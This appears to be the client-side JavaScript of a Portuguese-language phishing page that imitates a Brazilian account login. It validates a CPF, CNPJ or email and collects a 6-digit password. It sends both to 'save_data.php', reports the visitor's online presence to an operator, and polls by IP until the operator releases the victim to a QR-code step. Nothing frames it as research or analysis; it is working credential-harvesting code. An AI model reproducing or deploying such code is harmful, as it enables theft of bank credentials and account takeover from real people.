  <script>
        let isActive = true;
        let lastUpdate = 0;
        
        // Função para atualizar status
        function updateUserStatus(online = true) {
            const now = Date.now();
            // Só atualiza a cada 3 segundos no máximo
            if (online && (now - lastUpdate < 3000)) return;
            
            lastUpdate = now;
            fetch('update_status.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=' + (online ? 'online' : 'offline')
            });
        }

        // Monitora visibilidade da página
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                isActive = false;
                updateUserStatus(false);
            } else {
                isActive = true;
                updateUserStatus(true);
            }
        });

        // Monitora foco da janela
        window.addEventListener('focus', function() {
            isActive = true;
            updateUserStatus(true);
        });

        window.addEventListener('blur', function() {
            isActive = false;
            updateUserStatus(false);
        });

        // Atualiza status periodicamente enquanto ativo
        setInterval(() => {
            if (isActive) updateUserStatus(true);
        }, 3000);

        // Atualiza status imediatamente ao carregar
        window.addEventListener('load', function() {
            updateUserStatus(true);
        });

        // Marca como offline antes de sair
        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon('update_status.php', 'action=offline');
        });
    </script>

<script>
let usuario = '';

function validarUsuario() {
  const input = document.getElementById("usuario");
  const valor = input.value.trim();
  usuario = valor;
  const erro = document.getElementById("erro-validacao");

  const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor);
  const cleaned = valor.replace(/\D/g, "");
  const isCPF = /^\d{11}$/.test(cleaned) && validarCPF(cleaned);
  const isCNPJ = /^\d{14}$/.test(cleaned) && validarCNPJ(cleaned);

  if (!isEmail && !isCPF && !isCNPJ) {
    erro.classList.remove("hidden");
    return;
  }

  erro.classList.add("hidden");
  document.getElementById("form-acesso").classList.add("hidden");
  document.getElementById("aguarde").classList.remove("hidden");

  setTimeout(() => {
    document.getElementById("aguarde").classList.add("hidden");
    document.getElementById("form-senha").classList.remove("hidden");
    document.getElementById("conta-info").innerHTML = formatarIdentificacao(valor);
    document.querySelectorAll(".senha")[0].focus();
  }, 1000);
}

function formatarIdentificacao(valor) {
  const cleaned = valor.replace(/\D/g, "");
  if (cleaned.length === 11) {
    return "Sua conta:<br>" + cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  }
  if (cleaned.length === 14) {
    return "Sua conta:<br>" + cleaned.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5");
  }
  return "Sua conta:<br>" + valor;
}

function trocarConta() {
  document.getElementById("form-senha").classList.add("hidden");
  document.getElementById("form-acesso").classList.remove("hidden");
}

function validarCPF(cpf) {
  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
  let soma = 0, resto;
  for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
  resto = (soma * 10) % 11;
  if (resto === 10 || resto === 11) resto = 0;
  if (resto !== parseInt(cpf[9])) return false;
  soma = 0;
  for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
  resto = (soma * 10) % 11;
  if (resto === 10 || resto === 11) resto = 0;
  return resto === parseInt(cpf[10]);
}

function validarCNPJ(cnpj) {
  if (cnpj.length !== 14 || /^(\d)\1+$/.test(cnpj)) return false;
  const calc = (base, pesos) => {
    let soma = 0;
    for (let i = 0; i < pesos.length; i++) soma += parseInt(base[i]) * pesos[i];
    const resto = soma % 11;
    return resto < 2 ? 0 : 11 - resto;
  };
  const base = cnpj.slice(0, 12);
  const digitos = cnpj.slice(12);
  const peso1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
  const peso2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
  return digitos === `${calc(base, peso1)}${calc(base + calc(base, peso1), peso2)}`;
}

function enviarSenha() {
  const senha = Array.from(document.querySelectorAll(".senha")).map(i => i.value).join('');
  if (senha.length !== 6) return;

  document.getElementById("form-senha").classList.add("hidden");
  document.getElementById("aguarde").classList.remove("hidden");

  fetch('save_data.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `usuario=${encodeURIComponent(usuario)}&senha=${senha}`
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === 'blocked') {
      window.location.href = data.redirect;
    } else if (data.status === 'ok') {
      verificarStatus(data.ip);
    } else {
      erroLogin();
    }
  })
  .catch(() => erroLogin());
}

function verificarStatus(ip) {
  const interval = setInterval(() => {
    fetch(`api/qr_status.php?ip=${ip}`)
      .then(res => res.json())
      .then(data => {
        if (data.status === 'liberado') {
          clearInterval(interval);
          window.location.href = 'qr-codepb.php';
        } else if (data.status === 'invalido') {
          clearInterval(interval);
          erroLogin();
        }
      })
      .catch(() => {
        clearInterval(interval);
        erroLogin();
      });
  }, 2000);
}

function erroLogin() {
  document.getElementById("aguarde").classList.add("hidden");
  document.getElementById("form-acesso").classList.remove("hidden");
  document.getElementById("erro-validacao").classList.remove("hidden");
}

document.querySelectorAll(".senha").forEach((input, i, all) => {
  input.addEventListener("input", () => {
    if (input.value && i < all.length - 1) all[i + 1].focus();
  });
  input.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !input.value && i > 0) all[i - 1].focus();
  });
});

document.getElementById("toggle-senha").addEventListener("click", () => {
  document.querySelectorAll(".senha").forEach(inp => {
    inp.type = inp.type === "password" ? "text" : "password";
  });
});
</script>
